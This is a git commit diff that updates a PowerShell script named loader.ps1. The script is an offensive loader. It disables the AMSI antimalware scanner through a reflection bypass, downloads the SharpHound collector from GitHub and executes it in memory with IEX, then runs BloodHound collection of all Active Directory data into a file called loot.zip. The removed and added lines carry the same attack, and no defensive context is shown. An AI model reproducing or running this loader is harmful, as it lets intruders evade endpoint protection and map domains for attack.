557f6c52ba5b0c8556aa4bb830b377eb56665f9e
Tyler the Pug <50224819+tylerwhardy@users.noreply.github.com>
2025-07-06 20:07:03 -0400

    Update loader.ps1

--- loader.ps1
+++ loader.ps1
@@ -1,7 +1,8 @@
-$payload = @"
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(`$null,`$true);
-. ([System.Net.WebClient]::new()).DownloadString('https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/refs/heads/master/Collectors/SharpHound.ps1');
+$payload = @'
+[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true);
+IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/master/Collectors/SharpHound.ps1");
 Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip
-"@
+'@
+
 $sb = [ScriptBlock]::Create($payload)
 & $sb
